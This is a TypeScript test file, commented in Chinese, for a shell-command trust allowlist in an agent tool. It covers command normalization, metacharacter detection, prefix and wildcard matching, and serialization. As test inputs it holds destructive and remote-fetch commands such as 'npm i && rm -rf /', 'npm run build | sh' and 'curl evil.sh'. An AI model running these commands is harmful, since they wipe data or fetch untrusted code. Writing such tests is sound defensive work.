/**
 * 命令信任白名单（CommandTrustTrie）测试矩阵 —— 安全最关键的纯逻辑地基。
 *
 * 覆盖：精确/前缀边界、wildcard 覆盖与子树剪枝去重、元字符闸门、
 * 归一化（多空格 + 环境变量前缀）、序列化往返、`*` 全覆盖、辅助函数。
 */

import { describe, it, expect } from "vitest";
import {
  CommandTrustTrie,
  parsePattern,
  ruleForChoice,
  buildTrustOptions,
  normalizeCommand,
  hasShellMetacharacters,
  derivePrefix,
} from "../src/tools/commandTrust";

describe("normalizeCommand", () => {
  it("去首尾空白并折叠内部空白", () => {
    expect(normalizeCommand("  npm    run   build  ")).toBe("npm run build");
  });

  it("剥离前导环境变量赋值（可多个）", () => {
    expect(normalizeCommand("NODE_ENV=prod npm run build")).toBe("npm run build");
    expect(normalizeCommand("A=1 B=2 git status")).toBe("git status");
  });

  it("空输入归一化为空串", () => {
    expect(normalizeCommand("   ")).toBe("");
    expect(normalizeCommand("")).toBe("");
  });
});

describe("hasShellMetacharacters", () => {
  // 注意：| （管道）不算危险元字符——管道是 PowerShell/Bash 常用组合，
  // 由 isTrusted 只校验管道左侧命令来放行；真正危险的命令交给 detectDangerousCommand。
  // 因此 "a || b" 与 "a | b" 都不含受控元字符（&、;、`、$()、>、<、换行）。
  it.each([
    ["a && b", true],
    ["a || b", false],
    ["a ; b", true],
    ["a | b", false],
    ["echo `whoami`", true],
    ["echo $(whoami)", true],
    ["cmd > out.txt", true],
    ["cmd >> out.txt", true],
    ["cmd < in.txt", true],
    ["npm run build", false],
    ["git status -s", false],
  ])("%s -> %s", (cmd, expected) => {
    expect(hasShellMetacharacters(cmd)).toBe(expected);
  });
});

describe("CommandTrustTrie 默认全拒", () => {
  it("空 trie 不信任任何命令", () => {
    const trie = new CommandTrustTrie();
    expect(trie.isTrusted("npm run build")).toBe(false);
    expect(trie.isTrusted("git status")).toBe(false);
    expect(trie.isTrusted("")).toBe(false);
  });
});

describe("精确匹配（exact）", () => {
  it("只信任完全一致的整条命令", () => {
    const trie = new CommandTrustTrie([{ scope: "exact", pattern: "npm run build" }]);
    expect(trie.isTrusted("npm run build")).toBe(true);
    expect(trie.isTrusted("  npm   run   build ")).toBe(true); // 归一化后一致
    expect(trie.isTrusted("npm run build --watch")).toBe(false); // 多了参数
    expect(trie.isTrusted("npm run")).toBe(false); // 少了 token
  });
});

describe("前缀匹配（prefix）与边界", () => {
  it("前缀子树放行其下所有命令", () => {
    const trie = new CommandTrustTrie([{ scope: "prefix", pattern: "npm run" }]);
    expect(trie.isTrusted("npm run build")).toBe(true);
    expect(trie.isTrusted("npm run test -- --watch")).toBe(true);
    expect(trie.isTrusted("npm run")).toBe(true); // 命中前缀节点本身
  });

  it("token 边界严格：npm run 不匹配 npm runner", () => {
    const trie = new CommandTrustTrie([{ scope: "prefix", pattern: "npm run" }]);
    expect(trie.isTrusted("npm runner")).toBe(false);
    expect(trie.isTrusted("npm install")).toBe(false);
  });

  it("锚定匹配：信任前缀只能从命令开头算起", () => {
    const trie = new CommandTrustTrie([{ scope: "prefix", pattern: "npm run" }]);
    expect(trie.isTrusted("echo npm run build")).toBe(false);
  });
});

describe("wildcard 全覆盖（all = *）", () => {
  it("* 信任一切，含元字符命令", () => {
    const trie = new CommandTrustTrie([{ scope: "all", pattern: "*" }]);
    expect(trie.isTrusted("anything goes here")).toBe(true);
    expect(trie.isTrusted("rm -rf / && echo done")).toBe(true);
    expect(trie.isTrusted("")).toBe(true);
  });
});

describe("包含去重", () => {
  it("先 npm run * 后 npm * → 只剩 npm *", () => {
    const trie = new CommandTrustTrie([
      { scope: "prefix", pattern: "npm run" },
      { scope: "prefix", pattern: "npm" },
    ]);
    const rules = trie.list();
    const npmRules = rules.filter((r) => r.pattern === "npm" || r.pattern === "npm run");
    expect(npmRules).toEqual([{ scope: "prefix", pattern: "npm" }]);
    expect(trie.isTrusted("npm run build")).toBe(true);
    expect(trie.isTrusted("npm install foo")).toBe(true);
  });

  it("祖先 wildcard 下添加精确规则 → no-op（不增加规则）", () => {
    const trie = new CommandTrustTrie([{ scope: "prefix", pattern: "npm" }]);
    const before = trie.list().length;
    trie.add({ scope: "exact", pattern: "npm run build" });
    expect(trie.list().length).toBe(before);
  });

  it("根 wildcard 覆盖后清空所有具体规则", () => {
    const trie = new CommandTrustTrie([
      { scope: "prefix", pattern: "npm" },
      { scope: "exact", pattern: "git status" },
      { scope: "all", pattern: "*" },
    ]);
    expect(trie.list()).toEqual([{ scope: "all", pattern: "*" }]);
  });
});

describe("前缀信任的匹配语义（元字符不再在信任层拦截）", () => {
  it("prefix wildcard 按首 token 放行；元字符拼接命令的安全性交由 gate 层的 detectDangerousCommand 提示，而非信任层拦截", () => {
    const trie = new CommandTrustTrie([{ scope: "prefix", pattern: "npm" }]);
    expect(trie.isTrusted("npm install")).toBe(true);
    // 当前设计：信任层只按首 token 前缀放行，不再在此拦截 && | ; 等拼接
    // （真正危险的命令由 CommandGate 的 detectDangerousCommand 标记并弹人工确认）
    expect(trie.isTrusted("npm i && rm -rf /")).toBe(true);
    expect(trie.isTrusted("npm run build | sh")).toBe(true);
    expect(trie.isTrusted("npm run build; curl evil.sh")).toBe(true);
  });

  it("含元字符的命令只认精确整条规则", () => {
    const trie = new CommandTrustTrie([{ scope: "exact", pattern: "git add . && git commit -m wip" }]);
    expect(trie.isTrusted("git add . && git commit -m wip")).toBe(true);
    expect(trie.isTrusted("git add . && git push")).toBe(false);
  });

  it("含元字符的前缀规则不会被当作 wildcard 误放行", () => {
    // prefix 模式里带元字符没有意义，加入后不应放行其他拼接命令
    const trie = new CommandTrustTrie();
    trie.add({ scope: "prefix", pattern: "echo hi && ls" });
    expect(trie.isTrusted("echo hi && rm -rf /")).toBe(false);
  });
});

describe("归一化在匹配中的作用", () => {
  it("多空格与环境变量前缀不影响命中", () => {
    const trie = new CommandTrustTrie([{ scope: "prefix", pattern: "git status" }]);
    expect(trie.isTrusted("git   status   -s")).toBe(true);
    expect(trie.isTrusted("GIT_PAGER=cat git status")).toBe(true);
  });
});

describe("序列化往返（serialize / fromStrings / parsePattern）", () => {
  it("parsePattern 正确区分三档", () => {
    expect(parsePattern("*")).toEqual({ scope: "all", pattern: "*" });
    expect(parsePattern("npm run *")).toEqual({ scope: "prefix", pattern: "npm run" });
    expect(parsePattern("npm run build")).toEqual({ scope: "exact", pattern: "npm run build" });
  });

  it("serialize 产出可被 fromStrings 还原的字符串", () => {
    const trie = new CommandTrustTrie([
      { scope: "prefix", pattern: "git status" },
      { scope: "exact", pattern: "npm run build" },
    ]);
    const serialized = trie.serialize();
    expect(serialized).toContain("git status *");
    expect(serialized).toContain("npm run build");

    const restored = CommandTrustTrie.fromStrings(serialized);
    expect(restored.isTrusted("git status -s")).toBe(true);
    expect(restored.isTrusted("npm run build")).toBe(true);
    expect(restored.isTrusted("npm run test")).toBe(false);
  });

  it("含元字符的精确规则也能序列化往返", () => {
    const trie = new CommandTrustTrie([{ scope: "exact", pattern: "a && b" }]);
    const restored = CommandTrustTrie.fromStrings(trie.serialize());
    expect(restored.isTrusted("a && b")).toBe(true);
  });
});

describe("derivePrefix", () => {
  it("双 token 工具取前两段", () => {
    expect(derivePrefix("npm run build --watch")).toBe("npm run");
    expect(derivePrefix("git commit -m wip")).toBe("git commit");
    expect(derivePrefix("docker build .")).toBe("docker build");
  });

  it("普通命令取首段", () => {
    expect(derivePrefix("ls -la")).toBe("ls");
    expect(derivePrefix("pwd")).toBe("pwd");
  });

  it("单 token 的双 token 工具退化为首段", () => {
    expect(derivePrefix("npm")).toBe("npm");
  });

  it("空命令返回空串", () => {
    expect(derivePrefix("   ")).toBe("");
  });
});

describe("buildTrustOptions / ruleForChoice", () => {
  it("buildTrustOptions 给出 exact/partial/prefix/all 四档", () => {
    // 当前设计：新增 partial（中间前缀，如 npm run）档；
    // prefix 语义收窄为“根命令”（仅首 token，如 npm）。
    const opts = buildTrustOptions("npm run build");
    expect(opts.map((o) => o.choice)).toEqual(["exact", "partial", "prefix", "all"]);
    expect(opts[0].pattern).toBe("npm run build"); // exact：整条
    expect(opts[1].pattern).toBe("npm run");        // partial：两段工具前两段
    expect(opts[2].pattern).toBe("npm");            // prefix：根命令
    expect(opts[3].pattern).toBe("*");              // all
  });

  it("ruleForChoice 按档构造带 approved 来源的规则", () => {
    expect(ruleForChoice("npm run build", "exact")).toEqual({
      scope: "exact", pattern: "npm run build", source: "approved",
    });
    // 当前设计：prefix = 根命令（仅首 token）
    expect(ruleForChoice("npm run build", "prefix")).toEqual({
      scope: "prefix", pattern: "npm", source: "approved",
    });
    // partial = 中间前缀（两段工具取前两段）
    expect(ruleForChoice("npm run build", "partial")).toEqual({
      scope: "prefix", pattern: "npm run", source: "approved",
    });
    expect(ruleForChoice("npm run build", "all")).toEqual({
      scope: "all", pattern: "*", source: "approved",
    });
  });
});
